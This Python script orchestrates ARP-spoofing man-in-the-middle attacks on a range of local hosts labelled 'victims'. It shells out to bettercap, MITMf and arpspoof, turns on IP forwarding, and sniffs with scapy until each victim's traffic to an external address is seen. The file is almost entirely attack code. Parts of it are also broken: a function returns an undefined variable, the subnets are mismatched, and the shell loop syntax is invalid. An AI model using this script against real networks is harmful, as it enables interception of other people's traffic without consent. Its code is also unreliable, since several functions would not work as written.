from subprocess import Popen, PIPE
from scapy.all import sniff
import os
import time

EXTERNAL_ADDRESS = "192.168.1.10"
GATEWAY_ADDRESS = "192.168.0.1"
IP_RANGE = (20, 30)

def run_command(cmd):
	process = Popen([cmd], stdout=PIPE, shell=True)
	stdout, stderr = process.communicate()
	return out
 
victims = []
[[ victims.append("192.168.0.%d" % i) for i in range(*IP_RANGE) ]]

# Custom function to be apllied to each sniffed packet
def wait_all_victims(packet):
	src_addr = packet[0][1].src
	dst_addr = packet[0][1].dst
	if src_addr in victims and dst_addr==EXTERNAL_ADDRESS:
		victims.remove(src_addr)
	if len(victims) == 0:
		exit()
	
def ettercap():
	# TODO
	pass

def bettercap():
	cmd = """
	bettercap -caplet /dev/stdin <<< '
		net.probe on
		set arp.spoof.targets 192.168.1.{}-{}
		arp.spoof on
		'
	""".format(*IP_RANGE)
	os.system(cmd)
	
def mitmf():
	cmd = """
	python mitmf -i eth0
		--spoof
		--arp
		--target 192.168.0.{}-{},192.168.0.1/24
		--gateway {}
	""".format(*IP_RANGE, GATEWAY_ADDRESS)
	os.system(cmd)

def dsniff():
	cmd = """
	echo 1 > /proc/sys/net/ipv4/ip_forward ;
	for x in $(seq {} [${}-1]) ;
	do
		arpspoof -t {} 192.168.0.$x > /dev/null 2> /dev/null & ;
		arpspoof -t 192.168.0.$x {} > /dev/null 2> /dev/null & ;
	done
	""".format(*IP_RANGE, GATEWAY_ADDRESS, GATEWAY_ADDRESS)
	os.system(cmd)

def main():
	#dsniff()
	#bettercap()
	mitmf()
	try:
		sniff(filter="ip", prn=wait_all_victims)
	except PermissionError:
		print("Need to run as root")

if __name__ == '__main__':
	main()